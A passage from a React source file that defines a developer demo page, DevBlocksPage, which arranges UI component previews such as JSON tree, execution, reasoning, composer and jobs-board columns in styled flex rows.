      </div>
    </div>
  );
}

export default function DevBlocksPage() {
  return (
    <main style={{ padding: 24, background: "var(--bg-base, #0a0a0a)", minHeight: "100vh" }}>
      <div style={{ display: "flex", gap: 40, alignItems: "flex-start", marginBottom: 40 }}>
        <JsonTreeColumn />
      </div>
      <div style={{ display: "flex", gap: 40, alignItems: "flex-start", marginBottom: 40 }}>
        <ExecutionColumn />
      </div>
      <div style={{ display: "flex", gap: 40, alignItems: "flex-start", marginBottom: 40 }}>
        <ReasoningColumn />
      </div>
      <div style={{ display: "flex", gap: 40, alignItems: "flex-start", marginBottom: 40 }}>
        <ComposerDemo width={780} />
        <ComposerDemo width={420} />
        <ComposerDemo width={420} streaming />
      </div>
      <div style={{ display: "flex", gap: 40, alignItems: "flex-start", marginBottom: 40 }}>
        <DegenerateColumn />
      </div>
      <div style={{ display: "flex", gap: 40, alignItems: "flex-start", marginBottom: 40 }}>
        <JobsBoardDemo />
      </div>
      <div style={{ display: "flex", gap: 40, alignItems: "flex-start" }}>
        <Column width={780} />
        <Column width={460} />
      </div>
    </main>
  );
}
